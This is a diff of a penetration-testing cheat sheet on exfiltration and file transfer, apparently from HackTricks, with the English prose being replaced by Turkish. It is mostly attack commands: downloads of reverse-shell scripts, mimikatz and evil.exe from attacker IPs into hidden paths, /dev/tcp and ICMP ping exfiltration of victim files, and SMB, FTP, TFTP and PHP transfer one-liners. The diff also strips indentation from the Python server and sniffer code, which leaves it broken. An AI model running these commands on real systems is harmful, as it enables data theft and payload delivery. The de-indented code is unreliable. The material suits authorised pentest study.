@@ -2,39 +2,32 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Commonly whitelisted domains to exfiltrate information
+## Bilgi sızdırmak için yaygın olarak beyaz listeye alınmış alanlar
 
-Check [https://lots-project.com/](https://lots-project.com/) to find commonly whitelisted domains that can be abused
+Sıkça beyaz listeye alınmış ve kötüye kullanılabilecek alanları bulmak için [https://lots-project.com/](https://lots-project.com/) adresini kontrol edin.
 
 ## Copy\&Paste Base64
 
 **Linux**
-
 ```bash
 base64 -w0 <file> #Encode file
 base64 -d file #Decode file
 ```
-
 **Windows**
-
 ```
 certutil -encode payload.dll payload.b64
 certutil -decode payload.b64 payload.dll
 ```
-
 ## HTTP
 
 **Linux**
-
 ```bash
 wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
 wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
 curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
 fetch 10.10.14.14:8000/shell.py #FreeBSD
 ```
-
 **Windows**
-
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
 bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf
@@ -49,13 +42,11 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-
-### Upload files
+### Dosya Yükleme
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-- [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
-- Python module [uploadserver](https://pypi.org/project/uploadserver/):
-
+- [**GET ve POST'ları (aynı zamanda başlıkları) yazdıran SimpleHttpServer**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+- Python modülü [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
@@ -68,9 +59,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-
-### **HTTPS Server**
-
+### **HTTPS Sunucusu**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -105,31 +94,25 @@ from urllib.parse import quote
 app = Flask(__name__)
 @app.route('/')
 def root():
-    print(request.get_json())
-    return "OK"
+print(request.get_json())
+return "OK"
 if __name__ == "__main__":
-    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
+app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
-
 ## FTP
 
-### FTP server (python)
-
+### FTP sunucusu (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-
-### FTP server (NodeJS)
-
+### FTP sunucusu (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-
-### FTP server (pure-ftp)
-
+### FTP sunucusu (pure-ftp)
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -147,9 +130,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-
-### **Windows** client
-
+### **Windows** istemcisi
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -160,37 +141,31 @@ echo GET mimikatz.exe >> ftp.txt
 echo bye >> ftp.txt
 ftp -n -v -s:ftp.txt
 ```
-
 ## SMB
 
-Kali as server
-
+Kali sunucu olarak
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-
-Or create a smb share **using samba**:
-
+Veya **samba** kullanarak bir smb paylaşımı oluşturun:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
 chmod 777 /tmp/smb
 #Add to the end of /etc/samba/smb.conf this:
 [public]
-    comment = Samba on Ubuntu
-    path = /tmp/smb
-    read only = no
-    browsable = yes
-    guest ok = Yes
+comment = Samba on Ubuntu
+path = /tmp/smb
+read only = no
+browsable = yes
+guest ok = Yes
 #Start samba
 service smbd restart
 ```
-
 Windows
-
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -198,54 +173,42 @@ CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentia
 WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
 WindPS-2> cd new_disk:
 ```
-
 ## SCP
 
-The attacker has to have SSHd running.
-
+Saldırganın SSHd'nin çalışıyor olması gerekir.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
-
 ## SSHFS
 
-If the victim has SSH, the attacker can mount a directory from the victim to the attacker.
-
+Eğer kurbanın SSH'si varsa, saldırgan kurbanın bir dizinini saldırgana bağlayabilir.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
-
 ## NC
-
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
 ```
-
 ## /dev/tcp
 
-### Download file from victim
-
+### Kurbandan dosya indir
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-
-### Upload file to victim
-
+### Kurbanın dosyasını yükle
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-
-thanks to **@BinaryShadow\_**
+**@BinaryShadow\_**'a teşekkürler
 
 ## **ICMP**
-
 ```bash
 # To exfiltrate the content of a file via pings you can do:
 xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
@@ -256,64 +219,50 @@ xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attack
 from scapy.all import *
 #This is ippsec receiver created in the HTB machine Mischief
 def process_packet(pkt):
-    if pkt.haslayer(ICMP):
-        if pkt[ICMP].type == 0:
-            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
-            print(f"{data.decode('utf-8')}", flush=True, end="")
+if pkt.haslayer(ICMP):
+if pkt[ICMP].type == 0:
+data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
+print(f"{data.decode('utf-8')}", flush=True, end="")
 
 sniff(iface="tun0", prn=process_packet)
 ```
-
 ## **SMTP**
 
-If you can send data to an SMTP server, you can create an SMTP to receive the data with python:
-
+Eğer bir SMTP sunucusuna veri gönderebiliyorsanız, veriyi almak için python ile bir SMTP oluşturabilirsiniz:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
-
 ## TFTP
 
-By default in XP and 2003 (in others it needs to be explicitly added during installation)
+Varsayılan olarak XP ve 2003'te (diğerlerinde kurulum sırasında açıkça eklenmesi gerekir)
 
-In Kali, **start TFTP server**:
-
+Kali'de, **TFTP sunucusunu başlat**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-
-**TFTP server in python:**
-
+**Python'da TFTP sunucusu:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-
-In **victim**, connect to the Kali server:
-
+**kurban** üzerinde, Kali sunucusuna bağlanın:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
-
 ## PHP
 
-Download a file with a PHP oneliner:
-
+Bir PHP oneliner ile bir dosya indirin:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
-
 ## VBScript
-
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
-
-**Victim**
-
+**Kurban**
 ```bash
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
@@ -345,23 +294,16 @@ echo ts.Close >> wget.vbs
 ```bash
 cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
-
 ## Debug.exe
 
-The `debug.exe` program not only allows inspection of binaries but also has the **capability to rebuild them from hex**. This means that by providing an hex of a binary, `debug.exe` can generate the binary file. However, it's important to note that debug.exe has a **limitation of assembling files up to 64 kb in size**.
-
+`debug.exe` programı yalnızca ikili dosyaların incelenmesine izin vermekle kalmaz, aynı zamanda **hex'ten yeniden inşa etme yeteneğine de sahiptir**. Bu, bir ikilinin hex'ini sağlayarak, `debug.exe`'nin ikili dosyayı oluşturabileceği anlamına gelir. Ancak, debug.exe'nin **64 kb boyutuna kadar dosyaları birleştirme sınırlaması** olduğunu belirtmek önemlidir.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-
-Then copy-paste the text into the windows-shell and a file called nc.exe will be created.
-
-- [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+Sonra metni windows-shell'e kopyalayıp yapıştırın ve nc.exe adında bir dosya oluşturulacaktır.
 
 ## DNS
-
-- [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
 {{#include ../banners/hacktricks-training.md}}
